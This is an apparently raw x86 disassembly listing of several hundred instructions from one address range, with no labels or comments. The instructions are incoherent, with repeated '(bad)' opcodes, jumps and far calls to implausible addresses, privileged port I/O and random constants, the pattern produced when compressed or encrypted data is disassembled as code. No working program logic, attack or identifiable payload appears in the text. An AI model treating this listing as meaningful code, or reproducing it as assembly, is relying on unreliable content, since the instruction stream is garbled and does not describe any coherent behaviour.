  423a2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423a2b:	add    eax,0x54f9bd30
  423a30:	lods   al,BYTE PTR ds:[esi]
  423a31:	(bad)  
  423a32:	sti    
  423a33:	xlat   BYTE PTR ds:[ebx]
  423a34:	test   eax,0xacb17565
  423a39:	ds mov ebx,0x356dff5f
  423a3f:	sub    al,0x46
  423a41:	push   cs
  423a42:	imul   BYTE PTR [ebx-0x18]
  423a45:	mov    bh,0x15
  423a47:	dec    ebx
  423a48:	dec    edi
  423a49:	fcomp  DWORD PTR [ebp-0x77]
  423a4c:	lds    ebp,FWORD PTR [ecx+0x2]
  423a4f:	shl    edx,cl
  423a51:	or     al,0x8
  423a53:	jecxz  0x423a9a
  423a55:	push   edi
  423a56:	test   al,0x5e
  423a58:	int3   
  423a59:	push   edx
  423a5a:	jo     0x4239ed
  423a5c:	jo     0x423a5f
  423a5e:	jb     0x423a24
  423a60:	inc    BYTE PTR [ebx-0x64]
  423a63:	jbe    0x423a54
  423a65:	dec    esp
  423a66:	outs   dx,DWORD PTR ds:[esi]
  423a67:	xor    al,0x9
  423a69:	repz xor eax,0xe76e7ac2
  423a6f:	imul   ebx,ebp,0xfa783a43
  423a75:	jecxz  0x423a24
  423a77:	mov    ah,0xf5
  423a79:	sbb    ebp,ebp
  423a7b:	jo     0x423a8d
  423a7d:	imul   eax,DWORD PTR [edi+0x2f8e11f3],0x356a7b0b
  423a87:	call   0xba2e590d
  423a8c:	jb     0x423a61
  423a8e:	ds fwait
  423a90:	mov    dh,0xf9
  423a92:	test   eax,0x2e9b6950
  423a97:	jge    0x423a6d
  423a99:	push   edi
  423a9a:	jmp    0x41a4d4a1
  423a9f:	enter  0xdeb5,0x66
  423aa3:	dec    al
  423aa5:	arpl   WORD PTR [eax-0x1],cx
  423aa8:	cmp    DWORD PTR [eax],ebp
  423aaa:	inc    esi
  423aab:	(bad)  
  423aac:	xchg   esp,eax
  423aad:	push   0x4
  423aaf:	test   al,0xab
  423ab1:	ds pushf 
  423ab3:	outs   dx,BYTE PTR ds:[esi]
  423ab4:	(bad)  
  423ab6:	rcl    BYTE PTR [ebx+0x14],1
  423ab9:	aam    0x37
  423abb:	mov    DWORD PTR ds:0x66b57e13,edx
  423ac1:	mov    cl,0xac
  423ac3:	push   edi
  423ac4:	ds cld 
  423ac6:	and    BYTE PTR [edi-0x23],cl
  423ac9:	pop    ds
  423aca:	mov    dl,0x89
  423acc:	fwait
  423acd:	xor    BYTE PTR [ecx-0x34],dh
  423ad0:	ror    DWORD PTR [edi+ebx*8+0x31],0x5a
  423ad5:	div    BYTE PTR [bx+si+0x44c0]
  423ada:	out    dx,eax
  423adb:	hlt    
  423adc:	pop    ebx
  423add:	ins    DWORD PTR es:[edi],dx
  423ade:	dec    edx
  423adf:	fdivr  st(4),st
  423ae1:	inc    ebp
  423ae2:	rcl    BYTE PTR [esi-0x55],1
  423ae5:	jecxz  0x423ae4
  423ae7:	pop    ebx
  423ae8:	push   ebx
  423ae9:	xchg   esp,eax
  423aea:	adc    edx,ecx
  423aec:	xchg   esp,eax
  423aed:	or     cl,BYTE PTR [edx]
  423aef:	cdq    
  423af0:	or     BYTE PTR [ebx+0x7300e148],cl
  423af6:	retf   0x9d13
  423af9:	dec    esp
  423afa:	mov    edx,0x21564e50
  423aff:	into   
  423b00:	(bad)  [edx-0x44]
  423b03:	add    al,BYTE PTR [eax]
  423b05:	out    dx,eax
  423b06:	and    ecx,eax
  423b08:	bound  ebx,QWORD PTR [edi*1+0x7b66032d]
  423b0f:	test   ebp,edx
  423b11:	mov    cl,0xee
  423b13:	fldcw  WORD PTR [edi]
  423b15:	push   ebp
  423b16:	xlat   BYTE PTR ds:[ebx]
  423b17:	je     0x423aba
  423b19:	or     DWORD PTR [ebx-0x2fa4d4ff],0xffffffa4
  423b20:	lahf   
  423b21:	lds    eax,FWORD PTR [ebx-0x7c880c64]
  423b27:	popa   
  423b28:	mov    edi,0x3b8262a9
  423b2d:	enter  0xf003,0x64
  423b31:	add    eax,0xe35b0583
  423b36:	push   0x74b6a8ab
  423b3b:	jno    0x423b16
  423b3d:	xchg   ecx,eax
  423b3e:	arpl   WORD PTR [esi-0x261b115b],sp
  423b44:	xlat   BYTE PTR ds:[ebx]
  423b45:	xor    esp,edx
  423b47:	repz jne 0x423af6
  423b4a:	sub    ah,cl
  423b4c:	mov    esi,0x95311c34
  423b51:	xor    eax,0x744629a7
  423b56:	xor    al,0x73
  423b58:	or     dl,BYTE PTR [ebx-0x14]
  423b5b:	fidiv  DWORD PTR [ecx]
  423b5d:	je     0x423b3b
  423b5f:	pop    edi
  423b60:	dec    BYTE PTR [ebx+0x75438247]
  423b66:	inc    ebx
  423b67:	sbb    al,0xe7
  423b69:	outs   dx,DWORD PTR ds:[esi]
  423b6a:	ds fwait
  423b6c:	xor    bl,BYTE PTR [esi+0x6f7a41cd]
  423b72:	frstor [edi-0x47]
  423b75:	and    ch,bl
  423b77:	popf   
  423b78:	and    BYTE PTR [ecx],al
  423b7a:	adc    al,0xc9
  423b7c:	adc    esi,DWORD PTR [esi+0x7297edac]
  423b82:	loope  0x423bce
  423b84:	push   eax
  423b85:	dec    ebp
  423b86:	push   0xffffffd8
  423b88:	dec    ebx
  423b89:	loope  0x423b9b
  423b8b:	add    edx,ecx
  423b8d:	in     eax,0xed
  423b8f:	ja     0x423bb7
  423b91:	aad    0xe8
  423b93:	loope  0x423b88
  423b95:	hlt    
  423b96:	(bad)  
  423b97:	push   ebx
  423b98:	test   ch,0xf9
  423b9b:	loopne 0x423b6f
  423b9d:	test   DWORD PTR [ecx],ebp
  423b9f:	hlt    
  423ba0:	adc    eax,0xc47927a5
  423ba5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423ba6:	fwait
  423ba7:	adc    cl,0x1c
  423baa:	pop    edx
  423bab:	or     eax,esi
  423bad:	dec    ebx
  423bae:	fld    DWORD PTR [esi-0x3]
  423bb1:	pop    ebp
  423bb2:	leave  
  423bb3:	xchg   esp,eax
  423bb4:	pop    es
  423bb5:	pop    esi
  423bb6:	push   ds
  423bb7:	fnstsw WORD PTR [ebx+eax*8+0x22bbd230]
  423bbe:	imul   ebp,DWORD PTR [edi],0x8e78f015
  423bc4:	pusha  
  423bc5:	lahf   
  423bc6:	or     bl,bh
  423bc8:	jne    0x423b77
  423bca:	sar    BYTE PTR [eax+0x55dd4972],0xca
  423bd1:	(bad)  
  423bd2:	and    ebx,ebp
  423bd4:	jb     0x423c23
  423bd6:	sub    eax,0xb6cbf8ae
  423bdb:	(bad)  
  423bdc:	cmc    
  423bdd:	jbe    0x423c07
  423bdf:	jl     0x423c03
  423be1:	outs   dx,BYTE PTR ds:[esi]
  423be2:	test   DWORD PTR [edi+0x74],0x2ac427e
  423be9:	fiadd  WORD PTR [edi-0x16a1b65f]
  423bef:	jb     0x423bf4
  423bf1:	xor    BYTE PTR [ebp-0x1e7c5867],dh
  423bf7:	jl     0x423c28
  423bf9:	aam    0x3e
  423bfb:	xchg   edi,eax
  423bfc:	(bad)  
  423bfd:	outs   dx,DWORD PTR ds:[esi]
  423bfe:	and    ah,ah
  423c00:	outs   dx,DWORD PTR ds:[esi]
  423c01:	sbb    BYTE PTR [edi+0x5217db91],dh
  423c07:	mov    DWORD PTR [esi],eax
  423c09:	cmp    al,0xe9
  423c0b:	popa   
  423c0c:	les    esp,FWORD PTR [ecx+esi*8]
  423c0f:	arpl   WORD PTR [ebx],dx
  423c11:	xor    esi,DWORD PTR [ebx]
  423c13:	sbb    DWORD PTR [esi-0x329045c2],esi
  423c19:	or     dh,BYTE PTR [eax+ecx*4-0x3f48af89]
  423c20:	int    0x72
  423c22:	add    eax,0x4650e0d
  423c27:	out    0x13,eax
  423c29:	jle    0x423c33
  423c2b:	popa   
  423c2c:	out    dx,eax
  423c2d:	cmp    dh,BYTE PTR [esi+0x1b7798b7]
  423c33:	sbb    DWORD PTR [ecx],ebp
  423c35:	out    0x5a,al
  423c37:	cmp    BYTE PTR [ebx+0x27],dh
  423c3a:	xor    ch,BYTE PTR [ebp+0x3b1faf01]
  423c40:	pop    ecx
  423c41:	pop    esp
  423c42:	hlt    
  423c43:	scas   al,BYTE PTR es:[edi]
  423c44:	jle    0x423c30
  423c46:	cmp    eax,0x7880988c
  423c4b:	leave  
  423c4c:	out    0xea,al
  423c4e:	cmp    ch,ah
  423c50:	int    0x20
  423c52:	dec    esp
  423c53:	loopne 0x423c46
  423c55:	lahf   
  423c56:	in     al,dx
  423c57:	jmp    0x423c86
  423c59:	push   ds
  423c5a:	cmp    dl,al
  423c5c:	sub    DWORD PTR [edi+0x1e7af936],0xffffff88
  423c63:	(bad)  
  423c64:	cld    
  423c65:	adc    ebx,esp
  423c67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423c68:	fst    QWORD PTR [ebx-0x5e5991c9]
  423c6e:	out    0xe9,eax
  423c70:	mov    bl,0xef
  423c72:	pop    ss
  423c73:	mov    edi,0x74102282
  423c78:	xor    bl,BYTE PTR [edi]
  423c7a:	out    0xa6,al
  423c7c:	fmul   DWORD PTR [ecx+ecx*2-0x3e]
  423c80:	jo     0x423cb1
  423c82:	mov    dh,0xf9
  423c84:	mov    ah,0x80
  423c86:	add    bl,bl
  423c88:	push   cs
  423c89:	ins    DWORD PTR es:[edi],dx
  423c8a:	mov    eax,ds:0xf22811f4
  423c8f:	fbld   TBYTE PTR [ebx-0x3b]
  423c92:	mov    ch,0x2d
  423c94:	xchg   ebp,eax
  423c95:	call   0x1a1f918a
  423c9a:	and    cl,0x5f
  423c9d:	mov    edx,0x899f168a
  423ca2:	hlt    
  423ca3:	jno    0x423d17
  423ca5:	loop   0x423c86
  423ca7:	(bad)  
  423ca8:	fbstp  TBYTE PTR ds:0xbcf19d19
  423cae:	add    bl,BYTE PTR [esi-0x649c8b33]
  423cb4:	repz ficomp WORD PTR [eax-0x6e036712]
  423cbb:	iret   
  423cbc:	lahf   
  423cbd:	inc    ebp
  423cbe:	mov    esp,0xe037f19c
  423cc3:	xchg   ecx,eax
  423cc4:	jbe    0x423c83
  423cc6:	push   cs
  423cc7:	(bad)  
  423cc8:	xchg   ebp,eax
  423cc9:	stc    
  423cca:	and    BYTE PTR [ebp+esi*4-0x14],dl
  423cce:	mov    ?,WORD PTR [esi+0x27]
  423cd1:	inc    ecx
  423cd2:	xchg   BYTE PTR [ebx+0x48],bl
  423cd5:	xlat   BYTE PTR ds:[ebx]
  423cd6:	dec    edx
  423cd7:	aam    0xc9
  423cd9:	stos   DWORD PTR es:[edi],eax
  423cda:	inc    edi
  423cdb:	xchg   esi,eax
  423cdc:	popf   
  423cdd:	or     DWORD PTR [ebx-0x3bfb9a8],0xfffffff1
  423ce4:	jbe    0x423cef
  423ce6:	loopne 0x423d22
  423ce8:	sbb    ebx,DWORD PTR cs:[ebx-0x79]
  423cec:	mov    dl,0xd8
  423cee:	test   eax,0x90cf32e3
  423cf3:	ss jle 0x423cf3
  423cf6:	cmp    ecx,esp
  423cf8:	inc    eax
  423cf9:	jmp    0x423cb5
  423cfb:	xor    DWORD PTR [esp+edi*1-0x2efeabb],esi
  423d02:	inc    ebp
  423d03:	mov    edi,0x44c994c4
  423d08:	pop    ds
  423d09:	retf   0x60e3
  423d0c:	cdq    
  423d0d:	mov    dl,0xfc
  423d0f:	xor    eax,DWORD PTR [ebp+0x1ad06807]
  423d15:	cmc    
  423d16:	sbb    ebp,DWORD PTR [esp+ebx*4+0x3e]
  423d1a:	dec    ecx
  423d1b:	sub    esp,DWORD PTR [edx]
  423d1d:	push   ecx
  423d1e:	cmp    DWORD PTR [edi+0x1e475357],0x3925c153
  423d28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423d29:	dec    edi
  423d2a:	jno    0x423cb8
  423d2c:	test   eax,0x19c82bf8
  423d31:	lds    edi,FWORD PTR [edi+edx*8-0x22720045]
  423d38:	clc    
  423d39:	test   edx,0x71e564b
  423d3f:	ret    0x4838
  423d42:	(bad)  
  423d43:	add    dl,ah
  423d45:	or     BYTE PTR [eax],cl
  423d47:	mov    edx,0xc9a51744
  423d4c:	cmc    
  423d4d:	sub    DWORD PTR [eax-0x7b],eax
  423d50:	popf   
  423d51:	xor    al,0xf3
  423d53:	sbb    al,0x2b
  423d55:	mov    ds:0x46b460bb,al
  423d5a:	ins    DWORD PTR es:[edi],dx
  423d5b:	in     al,0x14
  423d5d:	retf   0x2aba
  423d60:	push   cs
  423d61:	inc    ebp
  423d62:	gs (bad) 
  423d64:	jbe    0x423dcc
  423d66:	aaa    
  423d67:	fdivr  DWORD PTR [eax-0x37]
  423d6a:	adc    al,0xb8
  423d6c:	and    bh,0x24
  423d6f:	test   al,0x8d
  423d71:	adc    esi,0xa
  423d74:	lea    eax,[ebx]
  423d76:	jmp    0x78fd7f3d
  423d7b:	xchg   DWORD PTR [ebx+0x3],esi
  423d7e:	xchg   ebx,eax
  423d7f:	retf   0x80d8
  423d82:	test   eax,0x1e59e6b
  423d87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423d88:	out    0xfb,eax
  423d8a:	mov    ds:0x656c1e86,eax
  423d8f:	or     ecx,0x35def573
  423d95:	jle    0x423d18
  423d97:	and    eax,0x6facb24e
  423d9c:	arpl   WORD PTR [edx-0x3f],dx
  423d9f:	mov    ecx,0x593c0fe2
  423da4:	xor    cl,BYTE PTR [edi-0x44]
  423da7:	xchg   DWORD PTR [eax],ebp
  423da9:	psubsb mm3,mm0
  423dac:	loope  0x423d8f
  423dae:	xchg   ebx,eax
  423daf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423db0:	ss or  ch,bh
  423db3:	or     bh,BYTE PTR [edi]
  423db5:	dec    ebp
  423db6:	dec    ebp
  423db7:	cmp    edx,DWORD PTR [edx+0x2a]
  423dba:	sbb    eax,0x3e4371b7
  423dbf:	add    al,0x9c
  423dc2:	mov    bh,0x4e
  423dc4:	jne    0x423dbc
  423dc6:	mov    dl,0x2
  423dc8:	pop    ebp
  423dc9:	call   0x8a941cd4
  423dce:	dec    esp
  423dcf:	sahf   
  423dd0:	scas   eax,DWORD PTR es:[edi]
  423dd1:	call   0x1038:0x2aa5ae5e
  423dd8:	and    BYTE PTR [esi-0x3432319d],0x5f
  423ddf:	imul   esi,DWORD PTR [ebx+eax*1],0x1781b13d
  423de6:	and    eax,0xcc65eb54
  423deb:	retf   0xf9b5
  423dee:	ins    BYTE PTR es:[edi],dx
  423def:	pop    esi
  423df0:	jg     0x423e42
  423df2:	mov    ss,WORD PTR [ecx]
  423df4:	xlat   BYTE PTR ds:[ebx]
  423df5:	les    ebx,FWORD PTR [eax]
  423df7:	stos   DWORD PTR es:[edi],eax
  423df8:	js     0x423e20
  423dfa:	xor    al,0x44
  423dfc:	push   cs
  423dfd:	inc    edi
  423dfe:	into   
  423dff:	(bad)  
  423e00:	jle    0x423e09
  423e02:	sub    BYTE PTR [esp+ebx*4+0x59],bl
  423e06:	mov    esi,0xb0beb1c4
  423e0b:	repz pop ds
  423e0d:	sub    DWORD PTR [esi+0x55],0x3c1ff272
  423e14:	or     al,0xb7
  423e16:	xor    ebp,DWORD PTR [eax*4-0x6d43bb79]
  423e1d:	inc    ebp
  423e1e:	mov    ebx,ebx
  423e20:	fistp  WORD PTR [ecx-0x2440e84e]
  423e26:	and    al,0x10
  423e28:	jnp    0x423e3b
  423e2a:	rol    DWORD PTR [ebp+0x558b5f7d],0xd0
  423e31:	xor    DWORD PTR [ecx],esi
  423e33:	scas   eax,DWORD PTR es:[edi]
  423e34:	mov    esi,0x82813e95
  423e39:	or     esi,0x69955037
  423e3f:	std    
  423e40:	xlat   BYTE PTR ds:[ebx]
  423e41:	or     esp,esp
  423e43:	int    0xa5
  423e45:	jno    0x423ded
  423e47:	fstp   QWORD PTR [eax+0x7de39da9]
  423e4d:	shr    BYTE PTR [eax+ebx*2-0x4],0xd3
  423e52:	mov    dl,0xfc
  423e54:	fs es addr16 sti 
  423e58:	popa   
  423e59:	enter  0x6514,0x5a
  423e5d:	xor    DWORD PTR [eax],eax
  423e5f:	(bad)  
  423e60:	jmp    0x423e3d
  423e62:	mov    al,ds:0xdcfcef1
  423e67:	ds pop ds
  423e69:	jno    0x423ea2
  423e6b:	mov    edx,0xcd9204f3
  423e70:	and    BYTE PTR [edi],bh
  423e72:	outs   dx,DWORD PTR ds:[esi]
  423e73:	jo     0x423e4b
  423e75:	sub    dh,ah
  423e77:	add    BYTE PTR [esi-0x36f1f89a],dl
  423e7d:	inc    ebx
  423e7e:	iret   
  423e7f:	ins    DWORD PTR es:[edi],dx
  423e80:	test   al,0x70
  423e82:	popa   
  423e83:	sub    ebp,edx
  423e85:	mov    al,cl
  423e87:	popa   
  423e88:	inc    ebp
  423e89:	jge    0x423e64
  423e8b:	mov    dh,0x9c
  423e8d:	adc    DWORD PTR [ebx-0x6c],esi
  423e90:	outs   dx,DWORD PTR ds:[esi]
  423e91:	ret    
  423e92:	jecxz  0x423e34
  423e94:	mov    ds:0x8af8993e,al
  423e99:	and    DWORD PTR ds:0x1c86b79f,ebp
  423e9f:	(bad)  
  423ea0:	iret   
  423ea1:	or     al,0xc3
  423ea3:	adc    bh,al
  423ea5:	test   BYTE PTR [edi+eiz*8],0xa6
  423ea9:	push   eax
  423eaa:	xchg   ebx,eax
  423eab:	push   edi
  423eac:	lea    ebp,[ebp-0x6f79ef4]
  423eb2:	outs   dx,DWORD PTR ds:[esi]
  423eb3:	jae    0x423e87
  423eb5:	xchg   ebp,eax
  423eb6:	jge    0x423e3e
  423eb8:	xlat   BYTE PTR ds:[ebx]
  423eb9:	and    BYTE PTR [edx-0x295d813f],bl
  423ebf:	dec    ebp
  423ec0:	mov    edi,0xed1be05f
  423ec5:	rol    DWORD PTR [eax-0x31],cl
  423ec8:	rol    DWORD PTR [ecx],0x36
  423ecb:	je     0x423f0c
  423ecd:	xor    DWORD PTR [ecx],0xffffffb7
  423ed0:	mov    dh,0xe8
  423ed2:	fdivr  DWORD PTR [esi-0x75]
  423ed5:	or     eax,0xab15dbd6
  423eda:	loopne 0x423f41
  423edc:	jmp    0x423e9d
  423ede:	jne    0x423e8c
  423ee0:	ret    0xf168
  423ee3:	push   esp
  423ee4:	dec    ecx
  423ee5:	xchg   ebx,eax
  423ee6:	test   eax,0x20ff4ae6
  423eeb:	push   esi
  423eec:	jns    0x423f1f
  423eee:	jbe    0x423f32
  423ef0:	cmp    cl,BYTE PTR [eax+0x71707c84]
  423ef6:	lods   eax,DWORD PTR ds:[esi]
  423ef7:	fsub   QWORD PTR [esi]
  423ef9:	xor    dh,BYTE PTR [edx+0x57]
  423efc:	ret    0x2b29
  423eff:	aam    0x2d
  423f01:	xor    bh,BYTE PTR [esi-0x32198bc7]
  423f07:	js     0x423f4d
  423f09:	xor    edi,DWORD PTR [edi+0x8]
  423f0c:	add    DWORD PTR [esi+0xb],ebx
  423f0f:	(bad)  
  423f10:	and    cl,cl
  423f12:	sbb    BYTE PTR [ecx+0x3d7f4056],ah
  423f18:	scas   al,BYTE PTR es:[edi]
  423f19:	mov    BYTE PTR [ebx-0x3a],dl
  423f1c:	shl    DWORD PTR [edx+0x7c],0xc0
  423f20:	or     dh,BYTE PTR [edx-0x23]
  423f23:	out    dx,eax
  423f24:	xchg   BYTE PTR [ecx+0x34],cl
  423f27:	mov    ch,0xd7
  423f29:	jns    0x423f71
  423f2b:	dec    edi
  423f2c:	das    
  423f2d:	inc    ebp
  423f2f:	sub    esp,esi
  423f31:	(bad)  
  423f33:	dec    eax
  423f34:	repnz mov cl,cl
  423f37:	fisttp DWORD PTR [ecx-0x3ec22e47]
  423f3d:	sar    DWORD PTR [edi+0x2dbd1697],0x24
  423f44:	push   0x1
  423f46:	dec    esp
  423f47:	cmp    ecx,edi
  423f49:	xchg   esp,eax
  423f4a:	(bad)  
  423f4b:	stc    
  423f4c:	push   cs
  423f4d:	nop
  423f4e:	jmp    0x115e:0xe3479aee
  423f55:	call   0xde529cc9
  423f5a:	in     al,dx
  423f5b:	cmp    al,0xe3
  423f5d:	push   cs
  423f5e:	pop    edi
  423f5f:	mov    al,ds:0xd62f07ff
  423f64:	(bad)  
  423f65:	add    al,BYTE PTR [ebx]
  423f67:	mov    ebx,0x682aad6a
  423f6c:	jno    0x423f0c
  423f6e:	rcl    ah,cl
  423f70:	adc    al,0xc4
  423f72:	mov    eax,0x48596af4
  423f77:	fwait
  423f78:	adc    bh,BYTE PTR [ebp-0x18]
  423f7b:	xchg   esi,eax
  423f7c:	sbb    edx,esi
  423f7e:	out    dx,al
  423f7f:	push   edx
  423f80:	or     ebp,ebp
  423f82:	add    dl,BYTE PTR [edx]
  423f84:	dec    ebp
  423f85:	sub    ax,0xeabd
  423f89:	test   DWORD PTR [ebp+0x7a],0xf79d2796
  423f90:	inc    edx
  423f91:	add    BYTE PTR [edi+0x1d],dl
  423f94:	nop
  423f95:	add    al,0xfd
  423f97:	jnp    0x423f48
  423f99:	in     eax,dx
  423f9a:	inc    esi
  423f9b:	mov    BYTE PTR [esi+0x7a],dl
  423f9e:	add    ebp,DWORD PTR es:[ebp-0x70]
  423fa2:	aaa    
  423fa3:	icebp  
  423fa4:	cwde   
  423fa5:	out    dx,al
  423fa6:	add    dh,BYTE PTR [ecx]
  423fa8:	sub    al,0xa4
  423faa:	jbe    0x423fd0
  423fac:	fcomp  DWORD PTR [edi+0x44]
  423faf:	dec    ecx
  423fb0:	les    edi,FWORD PTR [eax+0x4236b04a]
  423fb6:	mov    eax,ds:0xdf1c71d2
  423fbb:	and    DWORD PTR [ebx-0x6708e54c],edx
  423fc1:	arpl   WORD PTR [ecx-0x505eaae2],bp
  423fc7:	inc    ecx
  423fc8:	lock inc esi
  423fca:	push   ds
  423fcb:	(bad)  
  423fcc:	jno    0x423f5d
  423fce:	push   ecx
  423fcf:	shld   edi,ebp,cl
  423fd2:	fisub  WORD PTR [di-0x6382]
  423fd7:	aas    
  423fd8:	xchg   edi,eax
  423fd9:	inc    edi
  423fda:	fmul   QWORD PTR [ecx+0x50]
  423fdd:	lods   eax,DWORD PTR ds:[esi]
  423fde:	adc    al,0xaa
  423fe0:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  423fe2:	adc    al,0x99
  423fe4:	jmp    DWORD PTR [edx+0x32]
  423fe7:	or     esi,esi
  423fe9:	push   cs
  423fea:	xchg   esi,eax
  423feb:	pop    es
  423fec:	daa    
  423fed:	xchg   DWORD PTR [ecx+0x2b2a2283],edi
  423ff3:	cwde   
  423ff4:	mov    cl,0x8d
  423ff6:	test   DWORD PTR [eax],eax
  423ff8:	in     eax,0x62
  423ffa:	sbb    ebp,edi
  423ffc:	sub    dl,bh
  423ffe:	sub    cl,BYTE PTR [ebx+eax*2+0x1a746179]
  424005:	add    eax,0xebb76e4e
  42400a:	push   0xd81b20e8
  42400f:	pop    ecx
  424010:	push   edi
  424011:	fnstcw WORD PTR [ebx-0x6b09f4db]
  424017:	je     0x42407b
  424019:	push   ebp
  42401a:	std    
  42401b:	jg     0x423fbb
  42401d:	aam    0x5a
  42401f:	or     eax,0x6822e31c
  424024:	mov    bl,0xbd
  424026:	stos   DWORD PTR es:[edi],eax
  424027:	jo     0x42407f
  424029:	popa   
  42402a:	push   ds
  42402b:	enter  0xcaa8,0xb1
  42402f:	and    al,0x1a
  424031:	jge    0x42408c
  424033:	test   al,0x71
  424035:	xor    al,dh
  424037:	push   cs
  424038:	arpl   WORD PTR [edx],bp
  42403a:	iret   
  42403b:	push   edi
  42403c:	in     eax,0xf3
  42403e:	sbb    DWORD PTR [edx],esi
  424040:	sub    ah,BYTE PTR [esi]
  424042:	jno    0x423fe4
  424044:	inc    ecx
  424045:	cmp    eax,0x4befbf25
  42404a:	mov    dl,0xc3
  42404c:	sbb    eax,0x197b5feb
  424051:	lds    ebp,FWORD PTR [esi-0x6d60ae60]
  424057:	mov    esi,0xad3a34a
  42405c:	(bad)  
  42405d:	or     eax,DWORD PTR [ebp+eiz*4+0x1b4b8994]
  424064:	add    eax,0xe006546a
  424069:	fld    QWORD PTR [ebx-0x69048fc1]
  42406f:	or     BYTE PTR es:[edi],cl
  424072:	sti    
  424073:	jmp    0xbdab:0x941e0b8f
  42407a:	in     eax,dx
  42407b:	add    al,0x84
  42407d:	dec    ebx
  42407e:	fwait
  42407f:	icebp  
  424080:	mov    ebx,0x77e8e70
  424085:	mov    al,ds:0x61c08afd
  42408a:	xor    al,BYTE PTR [ebx]
  42408c:	pop    edx
  42408d:	mov    cl,0x5c
  42408f:	xor    al,0xd4
  424091:	test   BYTE PTR [edx],dh
  424093:	sub    ah,dl
  424095:	sahf   
  424096:	or     al,0x27
  424098:	pop    edi
  424099:	test   DWORD PTR [esi-0x1b7621c9],0xe3f9fd12
  4240a3:	mov    WORD PTR [edx-0x57],?
  4240a6:	sbb    esp,ecx
  4240a8:	das    
  4240a9:	popa   
  4240aa:	cmp    bh,0x69
  4240ad:	cmp    al,0x70
  4240af:	dec    ebx
  4240b0:	(bad)
  4240b3:	inc    edx
  4240b4:	inc    esi
  4240b5:	pop    ss
  4240b6:	xor    DWORD PTR [ebp+eax*4+0x642d5ad5],esp
  4240bd:	pop    esi
  4240be:	ret    
  4240bf:	mov    dl,0xb7
  4240c1:	push   eax
  4240c2:	xor    ch,BYTE PTR fs:[esi+0x47]
  4240c6:	sub    al,0x27
  4240c8:	dec    esp
  4240c9:	lahf   
  4240ca:	add    BYTE PTR [edi],dl
  4240cc:	pop    esi
  4240cd:	pusha  
  4240ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4240cf:	dec    cl
  4240d1:	int    0xd9
  4240d3:	daa    
  4240d4:	enter  0xbbfc,0x6e
  4240d8:	enter  0x8171,0x7c
  4240dc:	sar    DWORD PTR [edi],0x99
  4240df:	fisubr DWORD PTR [esi]
  4240e1:	push   ss
  4240e2:	ins    DWORD PTR es:[edi],dx
  4240e3:	lea    esi,ds:0x8a6c
  4240e8:	aam    0x97
  4240ea:	jp     0x4240a0
  4240ec:	push   es
  4240ed:	jecxz  0x424134
  4240ef:	sub    ebp,DWORD PTR [eax]
  4240f1:	xchg   ebp,eax
  4240f2:	mov    edx,0x8b9b1894
  4240f7:	xor    eax,0x5a68240e
  4240fc:	or     eax,0xbe9aa698
  424101:	rol    BYTE PTR [edx-0x25],cl
  424104:	fistp  WORD PTR [esi]
  424106:	shr    BYTE PTR [ecx+eiz*8+0x23ef6fb],0xdc
  42410e:	cmp    esi,edx
  424110:	xor    al,0xd9
  424112:	cmp    dl,ah
  424114:	outs   dx,DWORD PTR ds:[esi]
  424115:	call   0x31401bb6
  42411a:	xchg   edx,eax
  42411b:	jecxz  0x4240ef
  42411d:	gs mov ss,eax
  424120:	adc    edx,edi
  424122:	ins    BYTE PTR es:[edi],dx
  424123:	mov    ch,ch
  424125:	sub    edi,DWORD PTR [edi+edx*1-0x51]
  424129:	pop    eax
  42412a:	mov    bh,0x5c
  42412c:	sbb    bx,WORD PTR [edi-0x7297f883]
  424133:	aas    
  424134:	and    DWORD PTR [ebx+0x68],edi
  424137:	popf   
  424138:	bound  esp,QWORD PTR [edx-0x128ace71]
  42413e:	adc    DWORD PTR ds:0x72c1d233,ebx
  424144:	xor    eax,0xa142272
  424149:	sub    DWORD PTR [ecx],edx
  42414b:	and    BYTE PTR [ecx],cl
  42414d:	push   cs
  42414e:	lods   al,BYTE PTR ds:[esi]
  42414f:	scas   al,BYTE PTR es:[edi]
  424150:	fcomip st,st(5)
  424152:	push   0xb
  424154:	pop    es
  424155:	dec    ebp
  424156:	jp     0x4240fd
  424158:	sub    eax,0x835bbd5f
  42415d:	and    dh,BYTE PTR [ecx+0x39]
  424160:	xchg   ecx,eax
  424161:	out    dx,eax
  424162:	mov    dh,0xe7
  424164:	arpl   dx,sp
  424166:	ret    0x63fb
  424169:	mov    al,ss:0x616ca182
  42416f:	into   
  424170:	xor    DWORD PTR [edx+0x26],0xffffffd9
  424174:	pop    eax
  424175:	cmp    al,BYTE PTR [ecx-0x6f02fde5]
  42417b:	fwait
  42417c:	in     eax,0x45
  42417e:	sub    BYTE PTR [ebx],0x9d
  424181:	xor    eax,0xb9175542
  424186:	and    eax,DWORD PTR [ebx+eiz*8+0x19e91264]
  42418d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42418e:	btr    DWORD PTR [ecx-0x25c4b8cd],edx
  424195:	daa    
  424196:	(bad)  
  424197:	std    
  424198:	jg     0x424160
  42419a:	xchg   ecx,eax
  42419b:	ror    DWORD PTR [ebx-0x7a],1
  42419e:	or     DWORD PTR [edx-0x10594840],ecx
  4241a4:	imul   ebp,esp,0xffffff8a
  4241a7:	out    dx,eax
  4241a8:	test   al,0x71
  4241aa:	mov    DWORD PTR [ebx+0x4b],eax
  4241ad:	push   esi
  4241ae:	push   cs
  4241af:	jmp    0x4ec8:0x83fbc4cf
  4241b6:	fnsave [edx]
  4241b8:	add    edx,DWORD PTR [ebp-0x72]
  4241bb:	xlat   BYTE PTR ds:[ebx]
  4241bc:	xchg   ebp,eax
  4241bd:	xchg   esp,eax
  4241be:	arpl   cx,bx
  4241c0:	and    bl,cl
  4241c2:	mov    cl,0x2f
  4241c4:	paddusb mm5,mm3
  4241c7:	dec    esi
  4241c8:	inc    eax
  4241c9:	mov    ds:0xa0fd28c,eax
  4241ce:	ss xchg ebx,eax
  4241d0:	xor    cl,BYTE PTR [esi]
  4241d2:	ror    DWORD PTR [ecx+eax*1+0xf],1
  4241d6:	loope  0x4241b1
  4241d8:	cmc    
  4241d9:	cmc    
  4241da:	push   esi
  4241db:	jp     0x4241db
